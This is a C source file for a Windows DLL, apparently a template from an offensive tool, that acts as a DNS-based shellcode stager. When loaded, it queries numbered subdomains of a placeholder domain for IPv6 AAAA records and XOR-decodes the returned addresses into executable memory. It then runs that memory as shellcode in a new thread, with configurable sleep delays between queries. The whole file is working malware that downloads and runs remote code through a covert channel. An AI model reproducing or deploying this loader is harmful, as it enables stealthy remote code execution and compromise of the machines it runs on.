#include <stdint.h>
#include <inttypes.h>
#include <winsock2.h>
#include <windns.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include "windows.h"
#include <winternl.h>
#include <psapi.h>
 #include <tlhelp32.h>

typedef struct in6_addr {
  union {
    u_char Byte[16];
    u_short Word[8];
#ifdef __INSIDE_CYGWIN__
    uint32_t __s6_addr32[4];
#endif
  } u;
} IN6_ADDR, *PIN6_ADDR, *LPIN6_ADDR;

typedef uint8_t u_int8_t;
typedef uint16_t u_int16_t;
typedef uint32_t u_int32_t;

LPVOID *GetShellCodeAddress(){

  IN6_ADDR Ipv6address;
  PDNS_RECORD results;
  DNS_STATUS resp;
  int i;
  i = 0;
  int z;
  int x;
  z = 0;
  DWORD dwOld;

  // Allocate Memory for our shellcode
  LPVOID allbuffer2 = VirtualAlloc(NULL, 0x5000, MEM_COMMIT, PAGE_READWRITE);

  VirtualProtect(allbuffer2, 0x5000, PAGE_EXECUTE_READWRITE, &dwOld);

  // Save the original allocated memory for later use
  void *original_allbuffer2 = allbuffer2;

  // Pointer to the domain name for later use
  char *domain;

  while(TRUE){
    // Do some format string to write full domain with prefix and save the to domain
    asprintf(&domain, "{PREFIX}%i.{DOMAIN}", i);

    // Send IPV6 "AAAA" request to the domain
    resp = DnsQuery_A(domain, 0x001c, DNS_QUERY_STANDARD, NULL, &results, NULL);
    if(resp != 0){
      // Important break in case the domain is not resolvable
      // Also Important to know the last domain to call for
      break;
    }else{
      // Debug Message
      // printf("[+] Host Resolved!\n");
    }

    // Save The IPV6 "Shellcode" chunck
    LPVOID Ipv6Address = &results->Data.AAAA.Ip6Address;

    // Write the shellcode bytes from Ipv6Address to the memory
    for (x = 0; x < 16 ; x++) {

        // Copy each byte from shellcode to TempByte after decoding it
        // In case there is no XOR encoding it will XOR to 0x00 which
        char TempByte = *((char *)Ipv6Address + x) ^ {KEY};

        // Copy the shellcode chunck to the previously allocated space.
        memcpy(allbuffer2 + z, &TempByte, 1);

        // Make sure to append to the next memory address inside the allocated space.
        z++;

}

// Increase domain prefix by 1 "Move to the other domain"
i++;

// Sleep based on user input
sleep({SLEEPTIME});
}

// Return the final decoded shellcode pointer
return allbuffer2;



}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {


HANDLE hThread;
LPVOID All;
DWORD dwOld;

LPVOID ShellcodeAddress = GetShellCodeAddress();

All = VirtualAlloc(NULL, 0x5000, MEM_COMMIT, PAGE_READWRITE);

VirtualProtect(All, 0x5000, PAGE_EXECUTE_READWRITE, &dwOld);

WriteProcessMemory(GetCurrentProcess(), All, ShellcodeAddress, 0x1600, NULL);

hThread = CreateThread(NULL,0,ShellcodeAddress,NULL,0,NULL);



    }

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
